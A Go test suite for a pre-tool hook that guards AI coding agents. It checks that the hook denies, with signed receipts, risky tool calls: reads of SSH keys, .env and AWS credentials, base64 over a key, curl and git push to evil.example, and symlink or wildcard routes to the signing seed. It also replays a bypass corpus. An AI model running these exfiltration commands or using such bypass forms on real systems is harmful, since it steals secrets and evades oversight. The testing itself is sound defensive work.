// quantum_posture: these tests exercise hook receipts signed with the
// classical Ed25519 workstation seed; no post-quantum primitive is involved.

package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"testing"

	"github.com/Mindburn-Labs/helm-ai-kernel/core/pkg/contracts"
	"github.com/Mindburn-Labs/helm-ai-kernel/core/pkg/workstation"
)

// hookBypassEnv is one provisioned hook installation: a home directory whose
// .helm-ai-kernel holds the signer, a pinned policy profile outside it, and a
// symlink that reaches the key directory under another name.
type hookBypassEnv struct {
	home    string
	dataDir string
	link    string
	policy  string
	args    []string
}

func newHookBypassEnv(t *testing.T, policyFixture string) hookBypassEnv {
	t.Helper()
	restoreHookClock(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	env := hookBypassEnv{home: home, dataDir: filepath.Join(home, ".helm-ai-kernel")}
	if _, err := ensureLocalWorkstationSigningSeed(env.dataDir); err != nil {
		t.Fatalf("provision signer: %v", err)
	}
	env.link = filepath.Join(t.TempDir(), "keys-link")
	if err := os.Symlink(filepath.Join(env.dataDir, "keys"), env.link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	env.args = []string{"--client", "claude-code", "--data-dir", env.dataDir}
	if policyFixture != "" {
		raw, err := os.ReadFile(filepath.Join(kernelRepoRoot(t), "fixtures", "workstation", "policies", policyFixture))
		if err != nil {
			t.Fatal(err)
		}
		env.policy = filepath.Join(t.TempDir(), "policy-profile.json")
		if err := os.WriteFile(env.policy, raw, 0o600); err != nil {
			t.Fatal(err)
		}
		env.args = append(env.args, "--policy-profile", env.policy, "--policy-profile-sha256", hookPolicyProfileDigest(t, env.policy))
	}
	return env
}

func (env hookBypassEnv) expand(text string) string {
	// The home directory spelled with a wildcard, a brace group or a bracket
	// in its first segment, for the absolute patterns a search tool roots at
	// "/".
	parts := strings.Split(strings.Trim(filepath.ToSlash(env.home), "/"), "/")
	first, rest := parts[0], strings.Join(parts[1:], "/")
	return strings.NewReplacer(
		"{{HOME_STARS}}", "/"+strings.TrimSuffix(strings.Repeat("*/", len(parts)), "/"),
		"{{HOME_WILD}}", "/"+first[:1]+"*/"+rest,
		"{{HOME_BRACE}}", "/{"+first+",x}/"+rest,
		"{{HOME_CLASS}}", "/["+first[:1]+"]"+first[1:]+"/"+rest,
		"{{HOME_NAME}}", parts[len(parts)-1],
		"{{HOME}}", env.home, "{{LINK}}", env.link, "{{POLICY}}", env.policy,
	).Replace(text)
}

// run sends one tool call through the real hook entry point and returns
// whether the client was told to deny, plus the receipts that call wrote.
func (env hookBypassEnv) run(t *testing.T, tool string, input map[string]any) (bool, []*contracts.WorkstationPolicyDecisionReceipt) {
	t.Helper()
	before := map[string]bool{}
	for _, path := range globReceipts(t, env.dataDir) {
		before[path] = true
	}
	raw, err := json.Marshal(map[string]any{"tool_name": tool, "tool_input": input, "session_id": "bypass-corpus", "cwd": "/repo"})
	if err != nil {
		t.Fatal(err)
	}
	var stdout, stderr bytes.Buffer
	if code := runHookPreToolCmd(env.args, bytes.NewReader(raw), &stdout, &stderr); code != 0 {
		t.Fatalf("hook exit = %d stdout = %s stderr = %s", code, stdout.String(), stderr.String())
	}
	var receipts []*contracts.WorkstationPolicyDecisionReceipt
	for _, path := range globReceipts(t, env.dataDir) {
		if before[path] {
			continue
		}
		receipt, err := workstation.LoadDecisionReceipt(path)
		if err != nil {
			t.Fatalf("load receipt %s: %v", path, err)
		}
		if ok, err := workstation.VerifyDecisionReceiptSignature(receipt); err != nil || !ok {
			t.Fatalf("receipt %s signature ok=%v err=%v", path, ok, err)
		}
		receipts = append(receipts, receipt)
	}
	return strings.Contains(stdout.String(), `"permissionDecision":"deny"`), receipts
}

func describeReceipts(receipts []*contracts.WorkstationPolicyDecisionReceipt) string {
	parts := make([]string, 0, len(receipts))
	for _, receipt := range receipts {
		parts = append(parts, fmt.Sprintf("%s/%s/%s", receipt.Request.EffectType, receipt.Verdict, receipt.ReasonCode))
	}
	sort.Strings(parts)
	return strings.Join(parts, ", ")
}

func hasDenial(receipts []*contracts.WorkstationPolicyDecisionReceipt, reasonCode string) bool {
	for _, receipt := range receipts {
		if receipt.Verdict == contracts.WorkstationVerdictDeny && receipt.ReasonCode == reasonCode {
			return true
		}
	}
	return false
}

// TestHookBypassCorpus replays testdata/hook_bypass_corpus.tsv. A new bypass
// form is one line in that file.
func TestHookBypassCorpus(t *testing.T) {
	granted := newHookBypassEnv(t, "observe_draft.v1.allow.json")
	// {{HOME}}/proj is a project that holds a credential file,
	// {{HOME}}/copies a directory that holds a copy of the seed and
	// {{HOME}}/repo a project that holds neither, for the forms a search
	// decides by what it can reach.
	for path, content := range map[string]string{
		filepath.Join(granted.home, "proj", ".env"):                                 "TOKEN=x\n",
		filepath.Join(granted.home, "copies", "backup", workstationSigningSeedName): "00\n",
		filepath.Join(granted.home, "repo", "main.go"):                              "package main\n",
	} {
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	// A line marked @builtin is decided under the built-in profile, for a
	// form whose denial is the absence of a permission rather than a rule
	// every profile keeps. The two installations share one home directory.
	builtin := granted
	builtin.policy = ""
	builtin.args = []string{"--client", "claude-code", "--data-dir", granted.dataDir}
	file, err := os.Open(filepath.Join("testdata", "hook_bypass_corpus.tsv"))
	if err != nil {
		t.Fatal(err)
	}
	defer file.Close()

	cases := 0
	scanner := bufio.NewScanner(file)
	for line := 1; scanner.Scan(); line++ {
		text := scanner.Text()
		if strings.TrimSpace(text) == "" || strings.HasPrefix(text, "#") {
			continue
		}
		fields := strings.SplitN(text, "\t", 4)
		if len(fields) != 4 {
			t.Fatalf("corpus line %d has %d columns, want 4: %q", line, len(fields), text)
		}
		want, profile, _ := strings.Cut(fields[0], "@")
		reasonCode, tool := fields[1], fields[2]
		env := granted
		switch profile {
		case "":
		case "builtin":
			env = builtin
		default:
			t.Fatalf("corpus line %d: profile %q is not builtin", line, profile)
		}
		raw := env.expand(strings.ReplaceAll(fields[3], `\n`, "\n"))
		if want != "deny" && want != "allow" {
			t.Fatalf("corpus line %d: want %q is neither deny nor allow", line, want)
		}
		if (want == "deny") == (reasonCode == "-") {
			t.Fatalf("corpus line %d: a deny names its reason code and an allow uses -", line)
		}
		input := map[string]any{"command": raw}
		if tool != "Bash" {
			input = map[string]any{}
			if err := json.Unmarshal([]byte(raw), &input); err != nil {
				t.Fatalf("corpus line %d: input is not a JSON object: %v", line, err)
			}
		}
		cases++
		t.Run(fmt.Sprintf("line %d %s", line, tool), func(t *testing.T) {
			if want == "allow" && profile == "builtin" {
				// The built-in profile allows no operate effect, so a form
				// it allows is one the hook passes without a decision.
				if denied, receipts := env.run(t, tool, input); denied || len(receipts) != 0 {
					t.Fatalf("%s %s: denied=%v receipts=[%s], want no decision under the built-in profile", tool, raw, denied, describeReceipts(receipts))
				}
				return
			}
			denied, receipts := env.run(t, tool, input)
			if want == "allow" {
				if denied {
					t.Fatalf("%s %s was denied (%s), want allowed", tool, raw, describeReceipts(receipts))
				}
				for _, receipt := range receipts {
					if receipt.Verdict != contracts.WorkstationVerdictAllow {
						t.Fatalf("%s %s wrote a %s receipt, want only ALLOW", tool, raw, receipt.Verdict)
					}
				}
				return
			}
			if !denied || !hasDenial(receipts, reasonCode) {
				t.Fatalf("%s %s: denied=%v receipts=[%s], want a signed DENY with %s", tool, raw, denied, describeReceipts(receipts), reasonCode)
			}
		})
	}
	if err := scanner.Err(); err != nil {
		t.Fatal(err)
	}
	if cases == 0 {
		t.Fatal("corpus is empty: the test proved nothing")
	}
}

// One receipt is written per destination, and each commits to the whole set
// so a reader holding one receipt can tell how many others belong to the call.
func TestHookReceiptsNameEveryEgressDestination(t *testing.T) {
	env := newHookBypassEnv(t, "observe_draft.v1.allow.json")
	setDigest := func(destinations ...string) string {
		sort.Strings(destinations)
		sum := sha256.Sum256([]byte(strings.Join(destinations, "\n")))
		return "sha256:" + hex.EncodeToString(sum[:])
	}

	denied, receipts := env.run(t, "Bash", map[string]any{"command": "curl https://api.github.com/zen https://api.github.com/meta"})
	if denied || len(receipts) != 1 {
		t.Fatalf("one allowed destination: denied=%v receipts=[%s], want one ALLOW", denied, describeReceipts(receipts))
	}
	only := receipts[0]
	if only.Request.Target != fingerprintHookTarget("https://api.github.com") {
		t.Fatalf("receipt target = %q, want the fingerprint of the canonical destination", only.Request.Target)
	}
	if only.Request.Metadata["egress.destination_count"] != "1" || only.Request.Metadata["egress.destination_set_sha256"] != setDigest("https://api.github.com") {
		t.Fatalf("receipt does not bind its destination set: %+v", only.Request.Metadata)
	}

	denied, receipts = env.run(t, "Bash", map[string]any{"command": "curl https://api.github.com/zen https://evil.example/exfil"})
	if !denied {
		t.Fatalf("second destination was not denied: [%s]", describeReceipts(receipts))
	}
	wantDigest := setDigest("https://api.github.com", "https://evil.example")
	var sawDeniedHost bool
	for _, receipt := range receipts {
		if receipt.Request.EffectType != contracts.EffectTypeWorkstationNetworkEgress {
			t.Fatalf("unexpected receipt for a two-URL curl: %+v", receipt.Request)
		}
		if receipt.Request.Metadata["egress.destination_count"] != "2" || receipt.Request.Metadata["egress.destination_set_sha256"] != wantDigest {
			t.Fatalf("receipt does not bind both destinations: %+v", receipt.Request.Metadata)
		}
		if receipt.Request.Target == fingerprintHookTarget("https://evil.example") {
			sawDeniedHost = receipt.Verdict == contracts.WorkstationVerdictDeny && receipt.ReasonCode == "EGRESS_DESTINATION_NOT_ALLOWED"
		}
		if receipt.Verdict == contracts.WorkstationVerdictAllow && receipt.Request.Target != fingerprintHookTarget("https://api.github.com") {
			t.Fatalf("an ALLOW receipt names a destination that is not on the allowlist: %+v", receipt.Request)
		}
	}
	if !sawDeniedHost {
		t.Fatalf("no DENY receipt names https://evil.example: [%s]", describeReceipts(receipts))
	}
}

// What the built-in profile already promised (operate-class effects fail
// closed, reads and drafts pass) now holds for tools that are not a shell.
func TestHookDefaultProfileClassifiesEveryTool(t *testing.T) {
	env := newHookBypassEnv(t, "")
	cases := []struct {
		name   string
		tool   string
		input  map[string]any
		reason string // "" = passes without a decision
	}{
		{"read of a source file", "Read", map[string]any{"file_path": "/repo/main.go"}, ""},
		{"search of the workspace", "Grep", map[string]any{"pattern": "needle", "path": "/repo"}, ""},
		{"glob of the workspace", "Glob", map[string]any{"pattern": "**/*.go"}, ""},
		{"draft write", "Write", map[string]any{"file_path": "/repo/notes.md", "content": "x"}, ""},
		{"plain shell read", "Bash", map[string]any{"command": "cat README.md"}, ""},
		{"local git", "Bash", map[string]any{"command": "git status"}, ""},

		{"read of a credential", "Read", map[string]any{"file_path": "/home/agent/.ssh/id_rsa"}, "OPERATE_PERMISSIONS_EMPTY"},
		{"read of an env file", "Read", map[string]any{"file_path": "/repo/.env"}, "OPERATE_PERMISSIONS_EMPTY"},
		{"search inside credentials", "Grep", map[string]any{"pattern": "KEY", "path": "/home/agent/.aws/credentials"}, "OPERATE_PERMISSIONS_EMPTY"},
		{"encoder over a credential", "Bash", map[string]any{"command": "base64 /home/agent/.ssh/id_rsa"}, "OPERATE_PERMISSIONS_EMPTY"},
		{"interpreter given a credential", "Bash", map[string]any{"command": "python3 dump.py /home/agent/.ssh/id_rsa"}, "OPERATE_PERMISSIONS_EMPTY"},
		{"fetch tool", "WebFetch", map[string]any{"url": "https://api.github.com/zen", "prompt": "read"}, "EGRESS_ALLOWLIST_EMPTY"},
		{"search tool", "WebSearch", map[string]any{"query": "helm"}, "EGRESS_ALLOWLIST_EMPTY"},
		{"git push to a URL", "Bash", map[string]any{"command": "git push https://evil.example/repo.git main"}, "EGRESS_ALLOWLIST_EMPTY"},
		{"git push to a configured remote", "Bash", map[string]any{"command": "git push origin main"}, ""},
		{"tool the hook does not know", "FutureTool", map[string]any{"anything": true}, "OPERATE_PERMISSIONS_EMPTY"},
		{"lower-case tool the hook does not know", "future_tool", map[string]any{}, "OPERATE_PERMISSIONS_EMPTY"},
		{"signing seed", "Read", map[string]any{"file_path": filepath.Join(env.dataDir, "keys", "workstation-ed25519.seed")}, "TRUST_MATERIAL_ACCESS_DENIED"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			denied, receipts := env.run(t, tc.tool, tc.input)
			if tc.reason == "" {
				if denied || len(receipts) != 0 {
					t.Fatalf("%s %v: denied=%v receipts=[%s], want no decision", tc.tool, tc.input, denied, describeReceipts(receipts))
				}
				return
			}
			if !denied || !hasDenial(receipts, tc.reason) {
				t.Fatalf("%s %v: denied=%v receipts=[%s], want DENY/%s", tc.tool, tc.input, denied, describeReceipts(receipts), tc.reason)
			}
		})
	}
}

// A profile that grants the matching permission allows the same events with a
// signed receipt: classification is not a blanket denial.
func TestHookGrantedProfileAllowsClassifiedTools(t *testing.T) {
	env := newHookBypassEnv(t, "observe_draft.v1.allow.json")
	cases := []struct {
		tool       string
		input      map[string]any
		effectType string
	}{
		{"Read", map[string]any{"file_path": "/home/agent/.ssh/id_rsa"}, contracts.EffectTypeWorkstationSecretRead},
		{"WebFetch", map[string]any{"url": "https://api.github.com/zen", "prompt": "read"}, contracts.EffectTypeWorkstationNetworkEgress},
		{"FutureTool", map[string]any{"anything": true}, contracts.EffectTypeWorkstationMCPToolCall},
	}
	for _, tc := range cases {
		t.Run(tc.tool, func(t *testing.T) {
			denied, receipts := env.run(t, tc.tool, tc.input)
			if denied || len(receipts) != 1 || receipts[0].Verdict != contracts.WorkstationVerdictAllow || receipts[0].Request.EffectType != tc.effectType {
				t.Fatalf("%s: denied=%v receipts=[%s], want one ALLOW %s receipt", tc.tool, denied, describeReceipts(receipts), tc.effectType)
			}
		})
	}
	_, receipts := env.run(t, "FutureTool", map[string]any{"anything": true})
	if len(receipts) != 1 || receipts[0].Request.Metadata["mcp_input_sha256"] == "" || receipts[0].Request.ToolID != "FutureTool" {
		t.Fatalf("receipt for a tool the hook does not know must name the tool and bind its input: %+v", receipts)
	}
}

// A seed supplied with --signing-seed-file lives wherever the operator put
// it; the guard follows the flag, not the default layout.
func TestHookProtectsAnExplicitSigningSeedFile(t *testing.T) {
	env := newHookBypassEnv(t, "observe_draft.v1.allow.json")
	seedFile := filepath.Join(t.TempDir(), "operator", "signer.hex")
	if err := os.MkdirAll(filepath.Dir(seedFile), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(seedFile, []byte(strings.Repeat("ab", 32)+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	env.args = append(env.args, "--signing-seed-file", seedFile)
	for _, tc := range []struct {
		tool  string
		input map[string]any
	}{
		{"Bash", map[string]any{"command": "base64 " + seedFile}},
		{"Bash", map[string]any{"command": "cd " + filepath.Dir(seedFile) + " && cat signer.hex"}},
		{"Read", map[string]any{"file_path": seedFile}},
		{"Write", map[string]any{"file_path": seedFile, "content": "00"}},
	} {
		denied, receipts := env.run(t, tc.tool, tc.input)
		if !denied || !hasDenial(receipts, "TRUST_MATERIAL_ACCESS_DENIED") {
			t.Errorf("%s %v: denied=%v receipts=[%s], want DENY/TRUST_MATERIAL_ACCESS_DENIED", tc.tool, tc.input, denied, describeReceipts(receipts))
		}
	}
}

func regexpMatches(t *testing.T, pattern, value string) bool {
	t.Helper()
	compiled, err := regexp.Compile(pattern)
	if err != nil {
		t.Fatalf("matcher %q does not compile: %v", pattern, err)
	}
	return compiled.MatchString(value)
}

// The matcher decides which calls reach the hook at all; a tool it omits is
// never classified.
func TestSetupHookMatcherRoutesReadAndFetchTools(t *testing.T) {
	for target, tools := range map[string][]string{
		"claude-code": {"Bash", "Edit", "Write", "MultiEdit", "NotebookEdit", "Read", "Grep", "Glob", "WebFetch", "mcp__server__tool"},
		"hermes":      {"terminal", "write_file", "patch", "read_file", "search_files", "web_extract", "mcp_server_tool"},
		"deepseek":    {"bash", "write", "edit", "read", "grep", "webfetch", "mcp_server_tool"},
		"codex":       {"Bash", "apply_patch", "mcp__server__tool"},
	} {
		matcher := setupHookMatcher(target)
		for _, tool := range tools {
			if !regexpMatches(t, matcher, tool) {
				t.Errorf("%s matcher %q does not route %s", target, matcher, tool)
			}
		}
	}
}
